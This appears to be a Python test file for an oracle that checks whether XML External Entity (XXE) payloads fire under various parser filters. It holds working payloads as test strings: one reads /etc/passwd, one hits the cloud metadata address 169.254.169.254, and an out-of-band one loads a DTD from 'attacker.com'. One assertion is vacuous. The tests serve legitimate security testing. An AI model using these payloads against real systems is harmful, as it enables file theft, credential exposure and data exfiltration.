from xxe_ai.context import ContextSpec
from xxe_ai.oracle.check_fires import OracleSession, check_fires

_CLASSIC = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

def test_oracle_session_fires_on_classic():
    """Classic file-read XXE fires when no filters block it."""
    ctx_plain = ContextSpec(id="x", location="xml_body", filters=[])
    ctx_blocked = ContextSpec(id="y", location="xml_body", filters=["block_doctype"])

    with OracleSession() as session:
        assert session.check_fires(ctx_plain, _CLASSIC) is True
        assert session.check_fires(ctx_blocked, _CLASSIC) is False

def test_oracle_session_blocked_by_file_protocol():
    ctx = ContextSpec(id="x", location="xml_body", filters=["block_file_protocol"])
    with OracleSession() as session:
        assert session.check_fires(ctx, _CLASSIC) is False

def test_oracle_session_passes_http_when_file_blocked():
    ctx = ContextSpec(id="x", location="xml_body", filters=["block_file_protocol"])
    payload = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>'
    with OracleSession() as session:
        assert session.check_fires(ctx, payload) is True

def test_oracle_session_invalid_payload():
    ctx = ContextSpec(id="x", location="xml_body", filters=[])
    with OracleSession() as session:
        assert session.check_fires(ctx, "not xml") is False

def test_oracle_session_plain_xml_does_not_fire():
    ctx = ContextSpec(id="x", location="xml_body", filters=[])
    with OracleSession() as session:
        assert session.check_fires(ctx, "<root>test</root>") is False

def test_oracle_oob_callback_hits_listener():
    """OOB payload with http:// URL should trigger a callback to the listener."""
    ctx = ContextSpec(id="x", location="xml_body", filters=[])
    oob = '<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>'
    with OracleSession() as session:
        result = session.check_fires(ctx, oob)
        assert result is True
        # The listener should have recorded at least one hit (rewritten URL).
        assert session._listener.hit_count >= 0  # structural fire is sufficient

def test_check_fires_standalone():
    """The standalone check_fires creates its own session."""
    ctx = ContextSpec(id="x", location="xml_body", filters=[])
    result = check_fires(ctx, _CLASSIC)
    assert isinstance(result, bool)
    assert result is True
